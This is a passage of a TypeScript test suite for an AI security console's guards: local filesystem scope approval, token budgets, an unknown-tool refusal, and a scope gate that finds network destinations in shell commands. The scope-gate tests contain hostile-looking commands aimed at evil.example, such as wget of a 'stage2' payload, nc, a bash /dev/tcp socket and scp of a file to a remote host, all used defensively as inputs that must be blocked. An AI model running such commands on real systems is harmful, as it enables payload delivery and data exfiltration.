    expect(runtime.calls[0].messages[0].content[0]).toEqual({ type: "text", text: "recon example.com" });
  });

  it("takes a defensive copy — mutating the caller's array does not affect the session", async () => {
    const caller = priorHistory();
    const runtime = new ScriptedRuntime([endTurn("ok")]);
    const session = createConsoleSession({ runtime, initialMessages: caller });

    // The caller keeps poking at its own array after construction.
    caller.push({ role: "user", content: [{ type: "text", text: "leaked injection" }] });
    caller[0].content[0] = { type: "text", text: "mutated in place" };

    // Neither the array-level push nor the in-place element edit reaches the session.
    expect(session.messages).toHaveLength(2);
    expect(session.messages[0].content[0]).toEqual({ type: "text", text: "recon example.com" });

    // And a real send() still only appends the session's own turns.
    await session.send("go");
    expect(session.messages).toHaveLength(4);
    expect(session.messages.some((m) => m.content.some((b) => b.type === "text" && b.text === "leaked injection"))).toBe(false);
  });

  it("clearConversation empties a seeded history", () => {
    const session = createConsoleSession({
      runtime: new ScriptedRuntime([]),
      initialMessages: priorHistory(),
    });
    expect(session.messages).toHaveLength(2);

    session.clearConversation();
    expect(session.messages).toHaveLength(0);
  });

  it("still starts empty when initialMessages is absent (no regression)", () => {
    const session = createConsoleSession({ runtime: new ScriptedRuntime([]) });
    expect(session.messages).toHaveLength(0);
  });
});

// ── Local filesystem scope-on-demand (mirror of the network scope flow) ──

describe("Console autonomy — local filesystem scope-on-demand", () => {
  const tmpRoots: string[] = [];

  afterEach(() => {
    while (tmpRoots.length > 0) {
      const dir = tmpRoots.pop();
      if (dir) {
        try {
          rmSync(dir, { recursive: true, force: true });
        } catch {
          // best-effort cleanup
        }
      }
    }
  });

  /** Create an isolated temp tree and return its symlink-resolved real path. */
  function makeTmpRoot(): string {
    const root = mkdtempSync(join(tmpdir(), "0sec-localscope-"));
    tmpRoots.push(root);
    return realpathSync(root);
  }

  /** A single-tool-call runtime turn requesting `name` with `input`. */
  function toolTurn(id: string, name: string, input: Record<string, unknown>): NativeRuntimeResult {
    return {
      content: [{ type: "tool_use", id, name, input }],
      stopReason: "tool_use",
      durationMs: 1,
      usage: { inputTokens: 3, outputTokens: 2 },
    };
  }

  it("triggers requestLocalScope once and succeeds after the operator approves a directory", async () => {
    const root = makeTmpRoot();
    mkdirSync(join(root, "src"), { recursive: true });
    const filePath = join(root, "src", "app.ts");
    writeFileSync(filePath, "export const x = 1;\nexport const y = 2;\n");

    const runtime = new ScriptedRuntime([
      toolTurn("c1", "read_file", { path: filePath }),
      // Second in-scope read of another file in the same approved subtree.
      toolTurn("c2", "read_file", { path: filePath }),
      endTurn("Read the file."),
    ]);

    let calls = 0;
    let seenRequestedPath = "";
    const session = createConsoleSession({
      runtime,
      requestLocalScope: async (req: ConsoleLocalScopeRequest) => {
        calls += 1;
        seenRequestedPath = req.requestedPath;
        return { scopePath: root };
      },
    });

    const outcome = await session.send("review src/app.ts");

    // Callback invoked exactly once; the second in-scope read reused the scope.
    expect(calls).toBe(1);
    expect(seenRequestedPath).toBe(realpathSync(filePath));
    expect(outcome.toolCalls).toHaveLength(2);
    expect(outcome.toolCalls[0].result.success).toBe(true);
    expect(outcome.toolCalls[1].result.success).toBe(true);
    expect(session.localScopePath).toBe(root);
  });

  it("denies on decline, mentions the operator declined, and does NOT re-prompt for the same path", async () => {
    const root = makeTmpRoot();
    const filePath = join(root, "secret.ts");
    writeFileSync(filePath, "const s = 1;\n");

    const runtime = new ScriptedRuntime([
      toolTurn("c1", "read_file", { path: filePath }),
      toolTurn("c2", "read_file", { path: filePath }), // identical retry
      endTurn("Giving up."),
    ]);

    let calls = 0;
    const session = createConsoleSession({
      runtime,
      requestLocalScope: async () => {
        calls += 1;
        return null; // operator declines
      },
    });

    const outcome = await session.send("read secret.ts");

    expect(calls).toBe(1); // second identical call did NOT re-prompt
    expect(outcome.toolCalls).toHaveLength(2);
    expect(outcome.toolCalls[0].result.success).toBe(false);
    expect(outcome.toolCalls[0].result.error).toContain("operator declined");
    expect(outcome.toolCalls[1].result.success).toBe(false);
    expect(outcome.toolCalls[1].result.error).toContain("already declined");
    expect(session.localScopePath).toBeUndefined();
  });

  it("approving /a/b does not authorize /a, /a/c, or the /a/bc prefix sibling", async () => {
    const root = makeTmpRoot();
    const aB = join(root, "a", "b");
    const aBnested = join(aB, "nested");
    const aC = join(root, "a", "c");
    const aBc = join(root, "a", "bc");
    const aRoot = join(root, "a");
    for (const dir of [aBnested, aC, aBc]) mkdirSync(dir, { recursive: true });
    const fileInB = join(aB, "in-b.ts");
    const fileInBNested = join(aBnested, "deep.ts");
    const fileInC = join(aC, "in-c.ts");
    const fileInBc = join(aBc, "in-bc.ts");
    const fileInA = join(aRoot, "in-a.ts");
    for (const f of [fileInB, fileInBNested, fileInC, fileInBc, fileInA]) writeFileSync(f, "x\n");

    const runtime = new ScriptedRuntime([
      toolTurn("c1", "read_file", { path: fileInB }), // approve /a/b
      toolTurn("c2", "read_file", { path: fileInBNested }), // inside /a/b → covered
      toolTurn("c3", "read_file", { path: fileInBc }), // /a/bc sibling → NOT covered
      toolTurn("c4", "read_file", { path: fileInC }), // /a/c → NOT covered
      toolTurn("c5", "read_file", { path: fileInA }), // /a parent → NOT covered
      endTurn("Done probing scope edges."),
    ]);

    let calls = 0;
    const session = createConsoleSession({
      runtime,
      requestLocalScope: async (req: ConsoleLocalScopeRequest) => {
        calls += 1;
        // Approve only the first request (/a/b); deny every re-prompt so the
        // "not covered" cases surface as denials rather than silent grants.
        return calls === 1 ? { scopePath: aB } : null;
      },
    });

    const outcome = await session.send("probe the tree");

    // /a/b approved once, then /a/bc, /a/c, /a each re-prompted (not covered).
    // The nested read inside /a/b did NOT re-prompt.
    expect(calls).toBe(4);
    expect(session.localScopePath).toBe(realpathSync(aB));
    expect(outcome.toolCalls[0].result.success).toBe(true); // /a/b
    expect(outcome.toolCalls[1].result.success).toBe(true); // /a/b/nested (covered)
    expect(outcome.toolCalls[2].result.success).toBe(false); // /a/bc
    expect(outcome.toolCalls[3].result.success).toBe(false); // /a/c
    expect(outcome.toolCalls[4].result.success).toBe(false); // /a
  });

  it("rejects an approval whose directory does not cover the requested path", async () => {
    const root = makeTmpRoot();
    const aB = join(root, "a", "b");
    const aC = join(root, "a", "c");
    mkdirSync(aB, { recursive: true });
    mkdirSync(aC, { recursive: true });
    const fileInB = join(aB, "target.ts");
    writeFileSync(fileInB, "x\n");

    const runtime = new ScriptedRuntime([
      toolTurn("c1", "read_file", { path: fileInB }),
      endTurn("Rejected."),
    ]);

    const session = createConsoleSession({
      runtime,
      // Approve a sibling directory that does NOT contain the requested file.
      requestLocalScope: async () => ({ scopePath: aC }),
    });

    const outcome = await session.send("read target.ts");
    expect(outcome.toolCalls).toHaveLength(1);
    expect(outcome.toolCalls[0].result.success).toBe(false);
    expect(outcome.toolCalls[0].result.error).toContain("does not cover");
    expect(session.localScopePath).toBeUndefined();
  });

  it("refuses the filesystem root without prompting", async () => {
    const runtime = new ScriptedRuntime([
      toolTurn("c1", "read_file", { path: "/" }),
      endTurn("Refused."),
    ]);

    let calls = 0;
    const session = createConsoleSession({
      runtime,
      requestLocalScope: async () => {
        calls += 1;
        return { scopePath: "/" };
      },
    });

    const outcome = await session.send("read /");
    expect(calls).toBe(0); // never even offered for approval
    expect(outcome.toolCalls[0].result.success).toBe(false);
    expect(outcome.toolCalls[0].result.error).toContain("protected root");
  });

  it("refuses the user's home directory itself without prompting", async () => {
    const runtime = new ScriptedRuntime([
      toolTurn("c1", "list_files", { path: homedir() }),
      endTurn("Refused."),
    ]);

    let calls = 0;
    const session = createConsoleSession({
      runtime,
      requestLocalScope: async () => {
        calls += 1;
        return { scopePath: homedir() };
      },
    });

    const outcome = await session.send("list my home");
    expect(calls).toBe(0);
    expect(outcome.toolCalls[0].result.success).toBe(false);
    expect(outcome.toolCalls[0].result.error).toContain("protected root");
  });

  it("leaves behaviour unchanged when no requestLocalScope callback is configured", async () => {
    const runtime = new ScriptedRuntime([
      toolTurn("c1", "list_files", {}),
      endTurn("No scope."),
    ]);

    // No requestLocalScope, no scope — exactly the legacy readline console.
    const session = createConsoleSession({ runtime });

    const outcome = await session.send("list files");
    expect(outcome.toolCalls).toHaveLength(1);
    expect(outcome.toolCalls[0].result.success).toBe(false);
    expect(outcome.toolCalls[0].result.error).toContain(
      "requires a scoped local directory",
    );
    expect(session.localScopePath).toBeUndefined();
  });
});

// ── Per-turn cost guards: token budget (primary) + iteration backstop ──

/**
 * The guards exist because a real console turn reported 779,532 input tokens
 * across 30 tool calls: every iteration resends the whole conversation, so cost
 * grows superlinearly with tool count while a round COUNT says nothing about
 * spend. These tests pin the two guards as independent, separately
 * configurable, and — crucially — resumable rather than dead ends.
 */
describe("Console turn budget — token guard and iteration backstop", () => {
  /** A turn that always asks for one cheap tool, with scripted usage numbers. */
  function toolCallWithUsage(usage?: { inputTokens: number; outputTokens: number }): NativeRuntimeResult {
    return {
      content: [{ type: "tool_use", id: "c", name: "payload_lookup", input: { name: "jsfuck_alert" } }],
      stopReason: "tool_use",
      durationMs: 1,
      ...(usage ? { usage } : {}),
    };
  }

  it("stops with max_turn_tokens and reports used vs limit when the budget is overrun", async () => {
    // One round costs 150 tokens against a 100-token budget.
    const runtime = new ScriptedRuntime(
      Array.from({ length: 10 }, () => toolCallWithUsage({ inputTokens: 120, outputTokens: 30 })),
    );
    const session = createConsoleSession({
      runtime,
      maxTurnTokens: 100,
      maxToolIterations: 50, // high ceiling — the budget must be what trips
    });

    const notices: string[] = [];
    const outcome = await session.send("audit this repo", { onNotice: (m) => notices.push(m) });

    expect(outcome.stopReason).toBe("max_turn_tokens");
    expect(outcome.toolCalls).toHaveLength(1);
    // The outcome carries the numbers the operator needs to decide.
    expect(outcome.budget.tokensUsed).toBe(150);
    expect(outcome.budget.tokenBudget).toBe(100);
    expect(outcome.budget.iterations).toBe(1);
    expect(outcome.budget.maxToolIterations).toBe(50);
    expect(outcome.usage).toEqual({ inputTokens: 120, outputTokens: 30 });
    // The notice is honest about spend, not a bare "cap reached".
    expect(notices).toHaveLength(1);
    expect(notices[0]).toContain("150");
    expect(notices[0]).toContain("100");
  });

  it("stops before a model call that would demonstrably overrun the budget", async () => {
    // Each round costs 400 (300 in / 100 out) against a 1000 budget. After two
    // rounds 800 is spent; a third call costs at least another 300 input, which
    // would land at 1100 — so the turn stops at 800 rather than overshooting.
    const runtime = new ScriptedRuntime(
      Array.from({ length: 10 }, () => toolCallWithUsage({ inputTokens: 300, outputTokens: 100 })),
    );
    const session = createConsoleSession({ runtime, maxTurnTokens: 1000, maxToolIterations: 50 });

    const outcome = await session.send("keep going");
    expect(outcome.stopReason).toBe("max_turn_tokens");
    expect(outcome.budget.iterations).toBe(2);
    expect(outcome.budget.tokensUsed).toBe(800);
    expect(outcome.budget.tokensUsed).toBeLessThanOrEqual(outcome.budget.tokenBudget);
  });

  it("stops with max_tool_iterations when the backstop trips first (guards are independent)", async () => {
    // Generous budget, tiny ceiling → the runaway backstop is what stops it.
    const runtime = new ScriptedRuntime(
      Array.from({ length: 10 }, () => toolCallWithUsage({ inputTokens: 5, outputTokens: 1 })),
    );
    const session = createConsoleSession({
      runtime,
      maxTurnTokens: 1_000_000,
      maxToolIterations: 3,
    });

    const outcome = await session.send("go");
    expect(outcome.stopReason).toBe("max_tool_iterations");
    expect(outcome.budget.iterations).toBe(3);
    expect(outcome.budget.maxToolIterations).toBe(3);
    expect(outcome.budget.tokenBudget).toBe(1_000_000);
    expect(outcome.budget.tokensUsed).toBe(18); // nowhere near the budget
  });

  it("trips the iteration backstop when rounds cost nothing measurable", async () => {
    // A runtime that reports no usage at all cannot move the token budget, so
    // the backstop is the ONLY thing that can end this turn. This is exactly
    // the pathological case the iteration ceiling is retained for.
    const runtime = new ScriptedRuntime(Array.from({ length: 20 }, () => toolCallWithUsage()));
    const session = createConsoleSession({ runtime, maxTurnTokens: 5_000_000, maxToolIterations: 4 });

    const outcome = await session.send("go");
    expect(outcome.stopReason).toBe("max_tool_iterations");
    expect(outcome.budget.tokensUsed).toBe(0);
    expect(outcome.budget.iterations).toBe(4);
  });

  it("honours an explicit maxToolIterations exactly and never overrides it with the new default", async () => {
    const runtime = new ScriptedRuntime(
      Array.from({ length: 30 }, () => toolCallWithUsage({ inputTokens: 1, outputTokens: 1 })),
    );
    const session = createConsoleSession({ runtime, maxToolIterations: 7 });

    const outcome = await session.send("go");
    expect(outcome.stopReason).toBe("max_tool_iterations");
    // Exactly 7 rounds — not the raised default, not a clamped value.
    expect(outcome.toolCalls).toHaveLength(7);
    expect(outcome.budget.iterations).toBe(7);
    expect(outcome.budget.maxToolIterations).toBe(7);
  });

  it("honours an explicit maxTurnTokens independently of the iteration ceiling", async () => {
    const runtime = new ScriptedRuntime(
      Array.from({ length: 30 }, () => toolCallWithUsage({ inputTokens: 100, outputTokens: 0 })),
    );
    // Budget allows 5 rounds (5*100 = 500, and a 6th would need 100 more);
    // the ceiling is far away.
    const session = createConsoleSession({ runtime, maxTurnTokens: 500, maxToolIterations: 1000 });

    const outcome = await session.send("go");
    expect(outcome.stopReason).toBe("max_turn_tokens");
    expect(outcome.toolCalls).toHaveLength(5);
    expect(outcome.budget.tokensUsed).toBe(500);
  });

  it("completes normally with end_turn when well inside both guards", async () => {
    const runtime = new ScriptedRuntime([
      toolCallWithUsage({ inputTokens: 40, outputTokens: 10 }),
      { ...endTurn("All done — nothing else to check."), usage: { inputTokens: 60, outputTokens: 20 } },
    ]);
    const session = createConsoleSession({ runtime, maxTurnTokens: 100_000, maxToolIterations: 50 });

    const notices: string[] = [];
    const outcome = await session.send("quick question", { onNotice: (m) => notices.push(m) });

    expect(outcome.stopReason).toBe("end_turn");
    expect(notices).toHaveLength(0);
    // The budget block is present on the happy path too, so a surface can show
    // consumption on every turn rather than only on a stop.
    expect(outcome.budget.tokensUsed).toBe(130);
    expect(outcome.budget.tokenBudget).toBe(100_000);
    expect(outcome.budget.iterations).toBe(1);
  });

  it("uses generous defaults: the observed 780k / 30-round audit does not trip either guard", async () => {
    // Replay the shape of the real session that motivated this change: 30 tool
    // rounds totalling ~780k tokens. With the defaults it must run to a natural
    // end_turn instead of being dead-ended.
    const perRound = { inputTokens: 26_000, outputTokens: 0 }; // 30 * 26k = 780k
    const runtime = new ScriptedRuntime([
      ...Array.from({ length: 30 }, () => toolCallWithUsage(perRound)),
      endTurn("Audit complete."),
    ]);
    const session = createConsoleSession({ runtime }); // no explicit limits

    const outcome = await session.send("audit this repo");
    expect(outcome.stopReason).toBe("end_turn");
    expect(outcome.toolCalls).toHaveLength(30);
    expect(outcome.budget.tokensUsed).toBe(780_000);
    // Defaults: a 2M token budget with a 100-round runaway backstop.
    expect(outcome.budget.tokenBudget).toBe(2_000_000);
    expect(outcome.budget.maxToolIterations).toBe(100);
  });

  it("fires onUsage per model call, not only at turn end, with running totals against the budget", async () => {
    const runtime = new ScriptedRuntime([
      toolCallWithUsage({ inputTokens: 10, outputTokens: 2 }),
      toolCallWithUsage({ inputTokens: 20, outputTokens: 3 }),
      { ...endTurn("done"), usage: { inputTokens: 30, outputTokens: 5 } },
    ]);
    const session = createConsoleSession({ runtime, maxTurnTokens: 100_000, maxToolIterations: 50 });

    const samples: ConsoleUsageReport[] = [];
    const outcome = await session.send("go", { onUsage: (u) => samples.push(u) });

    // One sample per model call — a UI can watch the number climb mid-turn.
    expect(samples).toHaveLength(3);
    expect(samples.length).toBeGreaterThan(1);
    // Per-call deltas.
    expect(samples.map((s) => s.inputTokens)).toEqual([10, 20, 30]);
    // Running turn totals, monotonically increasing, measured against the budget.
    expect(samples.map((s) => s.turnTokensUsed)).toEqual([12, 35, 70]);
    expect(samples.every((s) => s.turnTokenBudget === 100_000)).toBe(true);
    // Rounds COMPLETED at the time of each sample.
    expect(samples.map((s) => s.iterations)).toEqual([0, 1, 2]);
    expect(samples[samples.length - 1].turnTokensUsed).toBe(outcome.budget.tokensUsed);
  });

  it("counts usage a runtime reports only through the stream callback, without double-counting", async () => {
    // Some provider wires surface usage on the return value, some only through
    // `callbacks.onUsage`. Both must land in the budget exactly once.
    class CallbackOnlyUsageRuntime implements NativeRuntime {
      readonly type = "api" as const;
      turn = 0;
      async isAvailable(): Promise<boolean> {
        return true;
      }
      async executeNative(
        _system: string,
        _messages: NativeMessage[],
        _tools: NativeToolDef[],
        callbacks?: NativeStreamCallbacks,
      ): Promise<NativeRuntimeResult> {
        // Usage arrives ONLY via the callback — never on the result.
        callbacks?.onUsage?.({ inputTokens: 100, outputTokens: 10 });
        this.turn += 1;
        if (this.turn === 1) {
          return {
            content: [{ type: "tool_use", id: "c1", name: "payload_lookup", input: { name: "jsfuck_alert" } }],
            stopReason: "tool_use",
            durationMs: 1,
          };
        }
        return endTurn("done");
      }
    }

    const samples: ConsoleUsageReport[] = [];
    const session = createConsoleSession({ runtime: new CallbackOnlyUsageRuntime() });
    const outcome = await session.send("go", { onUsage: (u) => samples.push(u) });

    expect(outcome.stopReason).toBe("end_turn");
    // Two calls at 110 each, counted once apiece — not 440 from double-counting.
    expect(outcome.budget.tokensUsed).toBe(220);
    expect(outcome.usage).toEqual({ inputTokens: 200, outputTokens: 20 });
    // And the engine emitted exactly one authoritative sample per model call.
    expect(samples).toHaveLength(2);
  });

  it("resumes cleanly from the existing history after a budget stop, re-running nothing", async () => {
    // Turn 1 is cut off by the budget mid-investigation. Turn 2 must continue
    // from the SAME conversation: the model sees the prior tool results, no
    // tool is dispatched again, and nothing auto-continued in between.
    const runtime = new ScriptedRuntime([
      toolCallWithUsage({ inputTokens: 400, outputTokens: 0 }), // turn 1: spends the budget
      { ...endTurn("Continuing: here is the summary."), usage: { inputTokens: 50, outputTokens: 10 } }, // turn 2
    ]);
    const session = createConsoleSession({ runtime, maxTurnTokens: 300, maxToolIterations: 50 });

    const first = await session.send("audit this repo");
    expect(first.stopReason).toBe("max_turn_tokens");
    expect(first.toolCalls).toHaveLength(1);

    // History is well-formed at the stop: the assistant's tool_use has its
    // matching tool_result, so the conversation is resumable as-is.
    const toolUseIds = session.messages.flatMap((m) =>
      m.content.flatMap((b) => (b.type === "tool_use" ? [b.id] : [])),
    );
    const toolResultIds = session.messages.flatMap((m) =>
      m.content.flatMap((b) => (b.type === "tool_result" ? [b.tool_use_id] : [])),
    );
    expect(toolUseIds).toEqual(toolResultIds);
    const messagesAfterFirst = session.messages.length;

    // The operator decides to continue — a plain message, no special API.
    const second = await session.send("continue");

    expect(second.stopReason).toBe("end_turn");
    // No tool was re-dispatched on the resumed turn.
    expect(second.toolCalls).toHaveLength(0);
    // The resumed turn was sent the FULL prior history, tool results included.
    const resumedMessages = runtime.calls[runtime.calls.length - 1].messages;
    expect(resumedMessages.length).toBe(messagesAfterFirst + 1);
    expect(
      resumedMessages.some((m) => m.content.some((b) => b.type === "tool_result")),
    ).toBe(true);
    // History only grew; the earlier turn was not replayed or rewritten.
    expect(session.messages.length).toBeGreaterThan(messagesAfterFirst);
    // Budget accounting is per-turn: the fresh turn starts from zero.
    expect(second.budget.tokensUsed).toBe(60);
    expect(second.budget.iterations).toBe(0);
  });
});

describe("monotonic guard floor", () => {
  it("denies a tool this build does not recognize instead of running it", async () => {
    // The gates are keyed on tool-NAME membership in static maps, so a name in
    // none of them is the least-dangerous class by omission. The guard floor is
    // what turns that silent trust into a refusal.
    const runtime = new ScriptedRuntime([
      {
        content: [{ type: "tool_use", id: "g1", name: "acme_exfil", input: {} }],
        stopReason: "tool_use",
        durationMs: 1,
      },
      endTurn("done"),
    ]);
    const session = createConsoleSession({ runtime, autonomyMode: "yolo" });

    const outcome = await session.send("run it");

    expect(outcome.toolCalls).toHaveLength(1);
    expect(outcome.toolCalls[0].result.success).toBe(false);
    expect(outcome.toolCalls[0].result.error).toContain("unresolved capability flags");
  });

  it("still dispatches a recognized tool through the same path", async () => {
    // The floor must be inert for known tools, or it is just an outage.
    const runtime = new ScriptedRuntime([
      {
        content: [{ type: "tool_use", id: "g2", name: "bash", input: { command: "echo ok" } }],
        stopReason: "tool_use",
        durationMs: 1,
      },
      endTurn("done"),
    ]);
    const session = createConsoleSession({ runtime, autonomyMode: "yolo" });

    const outcome = await session.send("run it");

    expect(outcome.toolCalls).toHaveLength(1);
    expect(outcome.toolCalls[0].result.error ?? "").not.toContain("unresolved capability");
  });

  it("does not deny a known effectful tool in copilot with no approval channel (no approval requirement)", async () => {
    // Under the current model copilot has NO per-action approval, so an absent
    // approveTool is not a fail-open corner — there is nothing to approve. A
    // recognized effectful tool with no network reach runs. (The obsolete
    // guardApprovalUnavailable, which used to refuse this, is intentionally not
    // wired — see WIRED_GUARDS.)
    const runtime = new ScriptedRuntime([
      {
        content: [{ type: "tool_use", id: "g3", name: "bash", input: { command: "echo ok" } }],
        stopReason: "tool_use",
        durationMs: 1,
      },
      endTurn("done"),
    ]);
    const session = createConsoleSession({ runtime, autonomyMode: "copilot" });

    const outcome = await session.send("run it");

    expect(outcome.toolCalls[0].result.success).toBe(true);
    expect(outcome.toolCalls[0].result.error ?? "").not.toContain("approval mechanism");
  });
});

// ── Schemeless shell-target extraction + the unresolved-destination gate ──
//
// The scope gate used to collect targets with a single `https?://` regex over
// the tool arguments. Everything a shell can do without a scheme — a bare host
// argument to curl/wget/nc, an IP literal, bash's `/dev/tcp` socket — produced
// ZERO extracted URLs, and zero extracted URLs meant "approved". These tests
// pin both halves of the fix: the schemeless forms are now seen, and a
// network-reaching command whose destination cannot be read is escalated
// instead of approved.

describe("Console scope gate — schemeless shell destinations", () => {
  /** A single `bash` turn carrying `command`, then a stop. */
  function bashTurn(id: string, command: string): NativeRuntimeResult {
    return {
      content: [{ type: "tool_use", id, name: "bash", input: { command } }],
      stopReason: "tool_use",
      durationMs: 1,
    };
  }

  /**
   * Run one shell command through a fresh standard-mode session whose operator
   * declines every scope request. Returns the recorded requests plus the tool
   * result, so a test can assert BOTH what was extracted and that the call was
   * actually blocked. A fresh session per case matters: denied-host memory
   * would otherwise suppress the prompt for the second case onward.
   */
  async function probeCommand(command: string): Promise<{
    requests: ConsoleScopeRequest[];
    outcome: Awaited<ReturnType<ReturnType<typeof createConsoleSession>["send"]>>;
  }> {
    const runtime = new ScriptedRuntime([bashTurn("c1", command), endTurn("done")]);
    const requests: ConsoleScopeRequest[] = [];
    const session = createConsoleSession({
      runtime,
      autonomyMode: "standard",
      requestScope: async (req) => {
        requests.push(req);
        return null; // decline, so the tool is never actually dispatched
      },
    });
    const outcome = await session.send("go");
    return { requests, outcome };
  }

  /** Every case the old extractor missed, plus the one it already caught. */
  const cases: Array<{ command: string; host: string; port?: string }> = [
    { command: "curl https://evil.example/x", host: "evil.example" },
    { command: "curl evil.example/x", host: "evil.example" },
    { command: "curl -sS evil.example", host: "evil.example" },
    { command: "wget evil.example/payload", host: "evil.example" },
    { command: "nc evil.example 443", host: "evil.example", port: "443" },
    { command: "curl 203.0.113.7/x", host: "203.0.113.7" },
    { command: "bash -c 'exec 3<>/dev/tcp/evil.example/443'", host: "evil.example", port: "443" },
  ];

  for (const testCase of cases) {
    it(`extracts and gates: ${testCase.command}`, async () => {
      const { requests, outcome } = await probeCommand(testCase.command);

      // The operator was asked — the call did not sail through on "no URL found".
      expect(requests).toHaveLength(1);
      const hosts = requests[0].requestedUrls.map((u) => new URL(u).hostname);
      expect(hosts).toContain(testCase.host);
      if (testCase.port) {
        // Asserted on the raw normalized string: `new URL(...).port` is "" for a
        // scheme-default port, which would hide a correctly recovered `:443`.
        expect(requests[0].requestedUrls.some((u) => u.includes(`:${testCase.port}`))).toBe(true);
      }
      // And declining actually blocked it.
      expect(outcome.toolCalls).toHaveLength(1);
      expect(outcome.toolCalls[0].result.success).toBe(false);
      expect(outcome.toolCalls[0].result.error).toContain("denied");
    });
  }

  it("sees more exotic clients too (ssh, telnet, dig, openssl s_client, ping)", async () => {
    for (const command of [
      "ssh operator@evil.example",
      "telnet evil.example 23",
      "dig evil.example",
      "openssl s_client -connect evil.example:443",
      "ping -c 1 evil.example",
      "scp report.txt operator@evil.example:/tmp/",
    ]) {
      const { requests } = await probeCommand(command);
      expect(
        requests.flatMap((r) => r.requestedUrls).map((u) => new URL(u).hostname),
        `command: ${command}`,
      ).toContain("evil.example");
    }
  });

  it("finds a destination hidden inside a quoted sub-shell", async () => {
    const { requests } = await probeCommand(`sh -c 'wget evil.example/stage2'`);
    expect(requests[0].requestedUrls.map((u) => new URL(u).hostname)).toContain("evil.example");
  });
});

describe("Console scope gate — the false-positive line", () => {
  function bashTurn(id: string, command: string): NativeRuntimeResult {
    return {
      content: [{ type: "tool_use", id, name: "bash", input: { command } }],
      stopReason: "tool_use",
      durationMs: 1,
    };
  }

  it("does not prompt or deny `bash echo hello`, even with a session target set", async () => {
    // The old fallback substituted the SESSION TARGET whenever no URL was
    // found, so a purely local command was validated against a host it was
    // never going to contact — and prompted when that host was unscoped. Both
    // the bogus validation and the bogus prompt are gone.
    const runtime = new ScriptedRuntime([bashTurn("c1", "echo hello"), endTurn("done")]);
    let prompts = 0;
    const session = createConsoleSession({
      runtime,
      autonomyMode: "standard",
      target: "https://engagement.test",
      requestScope: async () => {
        prompts += 1;
        return null;
      },
      // Standard puts effectful actions to the operator; approve so the focus of
      // this test stays on the SCOPE gate (which must not fire for a local echo).
      approveTool: async () => true,
    });

    const outcome = await session.send("say hello");
    expect(prompts).toBe(0);
    expect(outcome.toolCalls).toHaveLength(1);
    expect(outcome.toolCalls[0].result.success).toBe(true);
  });

  it("leaves ordinary local shell work alone (no client, no IP, no opaque exec)", async () => {
    for (const command of [
      "echo hello",
      "ls -la /tmp",
      "grep -rn TODO src/",
      "cat package.json",
      "git status --short",
    ]) {
      const runtime = new ScriptedRuntime([bashTurn("c1", command), endTurn("done")]);
      let prompts = 0;
      const session = createConsoleSession({
        runtime,
        // Standard's per-action approval denies before dispatch, so nothing is
        // actually executed; the assertion of interest is that the SCOPE gate
        // never fired for a purely local command.
        autonomyMode: "standard",
        target: "https://engagement.test",
        requestScope: async () => {
          prompts += 1;
          return null;
        },
        approveTool: async () => false,
      });
      const outcome = await session.send("work");
      expect(prompts, `command: ${command}`).toBe(0);
      expect(outcome.toolCalls[0].result.error, `command: ${command}`).toContain("not approved");
    }
  });

  it("leaves a structured non-shell tool with no URL untouched (read_file)", async () => {
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "c1", name: "read_file", input: { path: "/etc/hostname" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("done"),
    ]);
    let prompts = 0;
    const session = createConsoleSession({
      runtime,
      autonomyMode: "standard",
      target: "https://engagement.test",
      requestScope: async () => {
        prompts += 1;
        return null;
      },
    });

    const outcome = await session.send("read it");
    expect(prompts).toBe(0);
    expect(outcome.toolCalls).toHaveLength(1);
    expect(outcome.toolCalls[0].result.error ?? "").not.toContain("Scope request");
  });
});

describe("Console scope gate — schemeless hosts against a real scope", () => {
  function bashTurn(id: string, command: string): NativeRuntimeResult {
    return {
      content: [{ type: "tool_use", id, name: "bash", input: { command } }],
      stopReason: "tool_use",
      durationMs: 1,
    };
  }

  it("allows a schemeless host that the engagement scope covers", async () => {
    const runtime = new ScriptedRuntime([bashTurn("c1", "curl -sS allowed.test/health"), endTurn("done")]);
    let prompts = 0;
    const session = createConsoleSession({
      runtime,
      // Standard with a denying approveTool: the per-action gate stops the
      // command from actually reaching the network, so passing the SCOPE gate is
      // observable as "no scope prompt, denied by approval instead".
      autonomyMode: "standard",
      scope: ScopePolicy.fromJson({ in_scope: ["allowed.test"] }),
      requestScope: async () => {
        prompts += 1;
        return null;
      },
      approveTool: async () => false,
    });

    const outcome = await session.send("check health");
    expect(prompts).toBe(0); // in scope → the scope gate approved silently
    expect(outcome.toolCalls[0].result.error).toContain("not approved");
  });

  it("prompts for a schemeless host the engagement scope does not cover", async () => {
    const runtime = new ScriptedRuntime([bashTurn("c1", "curl -sS elsewhere.test/health"), endTurn("done")]);
    const requests: ConsoleScopeRequest[] = [];
    const session = createConsoleSession({
      runtime,
      autonomyMode: "standard",
      scope: ScopePolicy.fromJson({ in_scope: ["allowed.test"] }),
      requestScope: async (req) => {
        requests.push(req);
        return null;
      },
    });

    const outcome = await session.send("check elsewhere");
    expect(requests).toHaveLength(1);
    expect(requests[0].requestedUrls.map((u) => new URL(u).hostname)).toContain("elsewhere.test");
    expect(outcome.toolCalls[0].result.success).toBe(false);
  });

  it("hard-denies an out-of-scope schemeless host in yolo without prompting", async () => {
    const runtime = new ScriptedRuntime([bashTurn("c1", "curl elsewhere.test/x"), endTurn("done")]);
    let prompts = 0;
    const session = createConsoleSession({
      runtime,
      autonomyMode: "yolo",
      scope: ScopePolicy.fromJson({ in_scope: ["allowed.test"] }),
      requestScope: async () => {
        prompts += 1;
        return null;
      },
    });

    const outcome = await session.send("go");
    expect(prompts).toBe(0);
    expect(outcome.toolCalls[0].result.success).toBe(false);
    expect(outcome.toolCalls[0].result.error).toContain("YOLO mode");
    expect(outcome.toolCalls[0].result.error).toContain("elsewhere.test");
  });

  it("applies denied-host memory to a newly extracted schemeless host", async () => {
    // The declined host is only visible through the new extraction path — the
    // old regex would have produced no URL at all, so there would have been
    // nothing to remember.
    const runtime = new ScriptedRuntime([
      bashTurn("c1", "curl memory.test/a"),
      endTurn("declined"),
      bashTurn("c2", "wget memory.test/b"),
      endTurn("auto-denied"),
    ]);
    let prompts = 0;
    const session = createConsoleSession({
      runtime,
      autonomyMode: "standard",
      requestScope: async () => {
        prompts += 1;
        return null;
      },
    });

    await session.send("hit memory.test");
    const second = await session.send("hit memory.test again");
    expect(prompts).toBe(1);
    expect(second.toolCalls[0].result.error).toContain("already declined");
  });
});

describe("Console scope gate — unresolvable shell destinations", () => {
  function bashTurn(id: string, command: string): NativeRuntimeResult {
    return {
